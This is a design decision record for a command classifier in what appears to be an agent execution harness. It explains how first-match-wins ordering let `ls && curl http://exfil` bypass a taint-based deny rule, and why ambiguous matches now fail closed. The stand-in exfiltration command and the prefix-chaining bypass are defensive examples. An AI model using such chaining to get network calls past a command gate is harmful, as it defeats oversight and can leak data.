# D63 — A command claimed by two classes is ambiguous, and ambiguity fails closed


**Date:** 2026-08-14. **Closes finding #17; completes the classifier hardening begun in D62.**

- **The hole.** `classify_command` returned the **first** class whose patterns matched, so
  declaration order decided a security verdict. A world listing a permissive class before a
  restrictive one classified `ls && curl http://exfil` by its `ls` prefix: measured in a fully
  tainted session, bare `curl http://exfil` was DENY while `ls && curl http://exfil` was
  **ALLOW**. Prefixing `ls &&` bypassed the taint floor.
- **Latent, but the language invited it.** All shipped manifests order network-first with no
  permissive class, so none was vulnerable. But "list my safe commands first" is the natural
  authoring instinct, nothing documented that ordering carried security weight, and nothing
  validated it. The kernel's own test asserted `ls && curl` classifies as network — true only
  because that fixture happens to have no earlier-matching class. The suite encoded the safe
  ordering without ever stating the rule.
- **The decision.** Every class is evaluated. Exactly one matching target resolves to it; none
  resolves to `default_to`; **two or more different targets resolve to `default_to`**. A command
  line that looks like two different things is two different things, and the honest answer is
  the classifier's own fail-closed bucket rather than whichever entry the author typed first.
  Several classes pointing at the *same* target is not ambiguity — otherwise splitting a long
  pattern list for readability would silently fail closed.
- **D62 is what made this possible.** Ambiguity needs somewhere safe to go, and `default_to` is
  now mandatory. The two findings fix each other: without the catch-all requirement, "fail
  closed on ambiguity" would have meant falling back to the raw action — ambient `Process`,
  outside the taint floor — which is the very hole D62 closed.
- **Alternatives rejected.**
  - *Evaluate all classes and pick the most restrictive match.* The obvious answer, and it
    requires a severity ordering over `SideEffectClass` that does not exist. `SideEffectClass`
    derives `Ord`, but from **declaration order** — ranking by it would encode policy in enum
    layout, silently, and change meaning whenever a variant is inserted. Inventing a severity
    table is exactly the kind of judgement about the author's ontology that D62 declined to make.
  - *Reject at compile time when a lower-severity class precedes a higher-severity one.* Same
    missing severity ordering, plus pattern overlap is undecidable in general, so the check
    would be both unprincipled and incomplete.
  - *Document that ordering is security-critical and leave the behaviour.* The fourth finding in
    this family where prose stated an invariant nothing enforced. Documentation was available
    and had not helped.
  - *Keep first-match-wins but warn on overlap at compile time.* Overlap is a property of
    command strings, not patterns; `ls ` and `curl ` do not overlap as patterns while
    `ls && curl` matches both.
- **A limitation found while shipping it.** The WASM freshness check (D60) did **not** catch the
  resulting artifact staleness: `classify_command` is not reachable through the exported
  `preview()` surface, so the semantic comparison saw no difference. An mtime anchor against the
  engine's sources now runs first — the version anchor added at 0.2.2 only moves at release, so
  within a release window a stale reference build still compared vacuously. Belt and braces:
  mtime catches "you did not rebuild", the semantic cases catch "the rebuild changed answers".
- **Related:** D36, D44, D62; `crates/harness-types/src/compiled.rs`,
  `crates/harness-preview/src/gate.rs` (golden vectors).
